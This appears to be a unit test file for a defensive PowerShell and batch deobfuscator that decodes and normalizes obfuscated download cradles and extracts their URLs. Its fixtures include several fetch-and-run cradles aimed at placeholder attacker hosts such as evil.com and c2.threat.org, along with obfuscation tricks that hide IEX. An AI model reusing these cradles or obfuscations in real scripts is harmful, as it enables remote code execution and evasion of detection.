"""
Automated Unit Tests for Invoke-CradleCrafter & PowerShell Stager Deobfuscator.
Validates Base64 decoding, format string reordering, char code casting, string reversals,
IEX alias unmasking, forensic URL/destination extraction, and memory zeroization.
"""

import base64
import unittest
from deobfuscator.cradlecrafter import (
    detect_cradle_signatures,
    decode_base64_payload,
    normalize_format_operators,
    normalize_char_arrays,
    normalize_string_reversals,
    normalize_string_concatenations,
    normalize_powershell_stager,
    extract_cradle_telemetry,
    normalize_cradlecrafter,
    CradleCrafterNormalizer,
    zeroize_dict,
    zeroize_bytes,
)
from deobfuscator.core import BatchDeobfuscator


class TestCradleCrafterDeobfuscator(unittest.TestCase):

    def test_detect_cradle_signatures_positive(self):
        script = 'powershell.exe -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkA'
        sig = detect_cradle_signatures(script)
        self.assertTrue(sig["is_cradle"])
        self.assertGreaterEqual(sig["confidence"], 0.5)
        self.assertIn("powershell_executable_invoked", sig["indicators"])
        self.assertIn("encoded_command_base64", sig["indicators"])

    def test_detect_cradle_signatures_negative(self):
        script = '@echo off\r\ndir /b C:\\Windows\r\necho Done.\r\n'
        sig = detect_cradle_signatures(script)
        self.assertFalse(sig["is_cradle"])
        self.assertEqual(len(sig["cradle_methods"]), 0)

    def test_decode_base64_payload_utf16le(self):
        raw_cmd = "(New-Object Net.WebClient).DownloadString('http://evil.com/stager.ps1') | IEX"
        b64 = base64.b64encode(raw_cmd.encode('utf-16le')).decode('ascii')
        decoded = decode_base64_payload(b64)
        self.assertEqual(decoded, raw_cmd)

    def test_decode_base64_payload_utf8(self):
        raw_cmd = "Invoke-WebRequest -Uri 'http://example.com/test.ps1'"
        b64 = base64.b64encode(raw_cmd.encode('utf-8')).decode('ascii')
        decoded = decode_base64_payload(b64)
        self.assertEqual(decoded, raw_cmd)

    def test_decode_base64_payload_corrupted(self):
        decoded = decode_base64_payload("NotValidBase64!!!@@@")
        self.assertIsNone(decoded)

    def test_normalize_format_operators(self):
        ps_snippet = '("{1}{0}" -f "Client","Net.Web")'
        result = normalize_format_operators(ps_snippet)
        self.assertIn("Net.WebClient", result)

        multi_arg = '("{2}{0}{1}" -f "oad","String","Downl")'
        result_multi = normalize_format_operators(multi_arg)
        self.assertIn("DownloadString", result_multi)

    def test_normalize_char_arrays(self):
        # Pattern 1: [char]73+[char]69+[char]88
        expr1 = '[char]73+[char]69+[char]88'
        res1 = normalize_char_arrays(expr1)
        self.assertIn("'IEX'", res1)

        # Pattern 2: [char]0x49+[char]0x45+[char]0x58
        expr2 = '[char]0x49+[char]0x45+[char]0x58'
        res2 = normalize_char_arrays(expr2)
        self.assertIn("'IEX'", res2)

        # Pattern 3: (-join (73,69,88|%{[char]$_}))
        expr3 = '(-join (73,69,88|%{[char]$_}))'
        res3 = normalize_char_arrays(expr3)
        self.assertIn("'IEX'", res3)

        # Pattern 4: [char[]]@(73,69,88) -join ''
        expr4 = "[char[]]@(73,69,88) -join ''"
        res4 = normalize_char_arrays(expr4)
        self.assertIn("'IEX'", res4)

    def test_normalize_string_reversals(self):
        rev1 = "'tneilCbeW.teN'[-1..-14] -join ''"
        res1 = normalize_string_reversals(rev1)
        self.assertEqual(res1, "'Net.WebClient'")

        rev2 = "-join ('gnirtSdaolnwoD'[-1..-14])"
        res2 = normalize_string_reversals(rev2)
        self.assertEqual(res2, "'DownloadString'")

    def test_normalize_string_concatenations(self):
        concat = "'Net.' + 'Web' + 'Client'"
        res = normalize_string_concatenations(concat)
        self.assertEqual(res, "'Net.WebClient'")

    def test_normalize_powershell_stager_backticks_and_aliases(self):
        ps = "$wc = New-Object `N`e`t`.`W`e`b`C`l`i`e`n`t; . ( GCI Alias:\\IE* ) ( $wc.DownloadString('http://payload.com') )"
        clean, meta = normalize_powershell_stager(ps)
        self.assertNotIn("`", clean)
        self.assertIn("IEX", clean)
        self.assertTrue(meta["aliases_resolved"])

    def test_extract_cradle_telemetry(self):
        sample = (
            'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://10.0.0.1/bin.exe\', '
            '\'C:\\Users\\Public\\test.exe\'); Start-Process C:\\Users\\Public\\test.exe"'
        )
        telemetry = extract_cradle_telemetry(sample)
        self.assertIn("http://10.0.0.1/bin.exe", telemetry["extracted_urls"])
        self.assertIn("C:\\Users\\Public\\test.exe", telemetry["extracted_destinations"])
        self.assertIn("downloadfile", telemetry["cradle_methods"])

    def test_normalize_cradlecrafter_encoded_command(self):
        raw_cmd = "(New-Object Net.WebClient).DownloadString('http://c2.threat.org/stage2.ps1') | IEX"
        b64 = base64.b64encode(raw_cmd.encode('utf-16le')).decode('ascii')
        batch_line = f"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc {b64}"

        clean_text, meta = normalize_cradlecrafter(batch_line)
        self.assertIn('-Command "(New-Object Net.WebClient).DownloadString(\'http://c2.threat.org/stage2.ps1\') | IEX"', clean_text)
        self.assertEqual(meta["decoded_payloads_count"], 1)
        self.assertIn("http://c2.threat.org/stage2.ps1", meta["extracted_urls"])
        self.assertIn("downloadstring", meta["cradle_methods"])

    def test_cradlecrafter_normalizer_class_lifecycle(self):
        env = {"stage": "stager"}
        normalizer = CradleCrafterNormalizer(custom_env=env)
        sample = "powershell -c (New-Object Net.WebClient).DownloadString('http://192.168.1.100/rev.ps1')|IEX"
        res, meta = normalizer.normalize(sample)
        self.assertIn("http://192.168.1.100/rev.ps1", meta["extracted_urls"])
        del normalizer

    def test_core_pipeline_integration(self):
        # Tests chunked assembly in batch file resolving into an EncodedCommand stager
        raw_cmd = "(New-Object Net.WebClient).DownloadString('http://malware.domain/shell.ps1') | IEX"
        b64 = base64.b64encode(raw_cmd.encode('utf-16le')).decode('ascii')
        half = len(b64) // 2
        part1 = b64[:half]
        part2 = b64[half:]

        batch_script = (
            f"@echo off\r\n"
            f"set p1=powershell -nop -enc \r\n"
            f"set c1={part1}\r\n"
            f"set c2={part2}\r\n"
            f"%p1%%c1%%c2%\r\n"
        )

        engine = BatchDeobfuscator(enable_cradlecrafter=True)
        clean, meta = engine.deobfuscate(batch_script)

        self.assertIn("http://malware.domain/shell.ps1", clean)
        self.assertIn("DownloadString", clean)
        self.assertTrue(meta["cradlecrafter_telemetry"]["is_cradle"])
        self.assertIn("http://malware.domain/shell.ps1", meta["cradlecrafter_telemetry"]["extracted_urls"])

    def test_cryptographic_zeroize(self):
        d = {"secret_payload": "IEX_STAGER_CODE", "buf": bytearray(b"SENSITIVE_KEY_1234")}
        zeroize_dict(d)
        self.assertEqual(len(d), 0)

        buf = bytearray(b"\xaa\xbb\xcc\xdd")
        zeroize_bytes(buf)
        self.assertEqual(buf, bytearray(b"\x00\x00\x00\x00"))


if __name__ == "__main__":
    unittest.main()
